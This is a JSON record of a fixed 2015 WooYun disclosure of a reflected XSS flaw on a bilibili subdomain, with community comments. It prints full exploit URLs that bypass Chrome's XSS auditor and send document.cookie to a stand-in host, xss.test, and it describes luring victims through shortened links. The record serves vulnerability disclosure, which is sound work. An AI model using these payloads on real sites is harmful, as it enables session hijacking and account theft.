{"id": 39029, "wybug_id": "wooyun-2015-0113343", "wybug_title": "bilibili某子站存在反射型XSS漏洞可成功获取用户权限（XSS auditor bypass技巧）", "wybug_corp": "bilibili.com", "wybug_author": "端端", "wybug_date": "2015-05-11 11:09", "wybug_open_date": "2015-05-19 08:28", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： bilibili某子站存在反射型XSS漏洞可成功获取用户权限（XSS auditor bypass技巧）适用于Windows版的Chrome浏览器以下测试基于Windows下的Google Chrome 41.0.2272.118 m (64-bit)（因为是自动升级，应该是最新版吧）p.s. 之前提交的时候，没有构造出可以将用户cookie传出来的URL（浏览器有XSS过滤器）在之前提交的漏洞（wooyun-2015-0113131）还没有开始审核的时候，又花了些时间最终构造出了可以实际利用的URL（不是只弹个警告框）所以在此重新提交，虽然已经留言不要通过之前的漏洞了，但如果还是通过了请无视 详细说明：  注意：以下测试基于Windows下的Google Chrome 41.0.2272.118 m (64-bit)存在漏洞的页面是\nhttps://bp.bilibili.com/account/pays?s_appId=&s_beginCtimeString=2015-05-09&s_endCtimeString=2015-05-09\n其中HTTP GET参数s_beginCtimeString与s_endCtimeString存在问题\n\n直接尝试注入代码的话会触发浏览器的XSS过滤器，浏览器会拒绝执行插入的脚本\n\n根据http://www.thespanner.co.uk/2015/02/19/another-xss-auditor-bypass/中提供的方法将\"/\"转义为\"&sol;\"（URLEncode后是%26sol;）同时感谢ZONE上 @Pany自留地 所发表的文章《XSS auditor bypass》(http://zone.wooyun.org/content/20180)让我了解到这篇文章构造URL\nhttps://bp.bilibili.com/account/pays?s_appId=&s_beginCtimeString=2015-05-09%22%3E%3Cscript/src=data:,alert(document.cookie);%26sol;%26sol;&s_endCtimeString=2015-05-09\n\n\n   漏洞证明：  之后尝试将cookie传出这个页面，但是并不顺利。在尝试调用远程js等等都被浏览器的XSS过滤器检出之后，一度陷入困境。最后准备将cookie加在跳转请求的HTTP GET参数部分用location.href跳出直接尝试\nhttps://bp.bilibili.com/account/pays?s_appId=&s_beginCtimeString=2015-05-09\"><script/src=data:,location.href=\"http:%26sol;%26sol;xss.test%26sol;\"+document.cookie;%26sol;%26sol;&s_endCtimeString=2015-05-09\n失败会不会是加号的原因使用javascript的String对象的concat方法连接字符串\nhttps://bp.bilibili.com/account/pays?s_appId=&s_beginCtimeString=2015-05-09\"><script/src=data:,a=\"http:%26sol;%26sol;xss.test%26sol;\",location.href=a.concat(document.cookie);%26sol;%26sol;&s_endCtimeString=2015-05-09\n顺利跳转\n\n那么将地址转向实际的测试地址来看一下\n\n等等……好像有哪里不太对……虽然通过错误日志也可以获取到传出的数据但是总归是有点太明显了果然还是需要加上\"?\"或者\"#\"否则作为路径服务器会无法解析的但是问题来了试了很多方法都加不进去……就好像只要加入问号或者井号就会被直接检出怎么办？还记得前面提到的两个插入点吗\"?\"的ASCII码是63我们构造以下URL\nhttps://bp.bilibili.com/account/pays?s_appId=&s_beginCtimeString=2015-05-09\"><script/src=data:,a=\"http:%26sol;%26sol;xss.test%26sol;\",b=document.cookie,k=63;%26sol;%26sol;&s_endCtimeString=2015-05-09</script><script/src=data:,location.href=a.concat(String.fromCharCode(k)).concat(b);%26sol;%26sol;\n在将攻击脚本拆成两部分分别放到两个参数中后，成功绕过\n\n上面的相当于先后执行\na=\"http://xss.test/\";b=document.cookie;k=63;\n和\nlocation.href=a.concat(String.fromCharCode(k)).concat(b);\n那么再稍微谈一下实际的利用过程通过短域名服务将攻击URL变得看上去人畜无害将生成的短域名提供给受害者短域名->漏洞URL->攻击者的页面获取cookie并保存->跳转至正常页面\n\n以下是测试中获取到的cookie(测试事先已经获得当事人同意)\n\n测试过程中当事人表示并未感觉到异样另外由于.bilibili.com的cookie中的用于标记会话的参数并未设置为HttpOnly导致js可以读取相应内容，使得攻击者可以以受害者的用户身份登录。   修复方案：  1、过滤、转义2、给重要的cookie设置HttpOnly   版权声明：转载请注明来源 端端@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-15 15:49 厂商回复： 谢谢 最新状态： 2015-05-19：谢谢  ", "replys": "漏洞评价：\n评论\n     2015-05-11 11:10 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  技术贴    \n     2015-05-11 18:13 |    \t\tDeadSea \t\t\t( 实习白帽子  |\t\t\t        Rank:86 漏洞数:28        | 静心)\t\t \n  关注鸟 坐等技术    \n     2015-05-12 09:56 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  过chrome 的filter了？ 是在<script>里的吧？    \n     2015-05-12 09:59 |    \t\t端端 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:18        | niconiconi~)\t\t \n  @数据流 不是在<script>里的，是在标签属性里的    \n     2015-05-12 10:07 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  @端端 ^_^关注     \n     2015-05-15 16:35 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  学习XSS auditor bypass    \n     2015-05-19 09:25 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  学习了，好像蛮有意思的    \n     2015-05-19 17:29 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  有意思    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}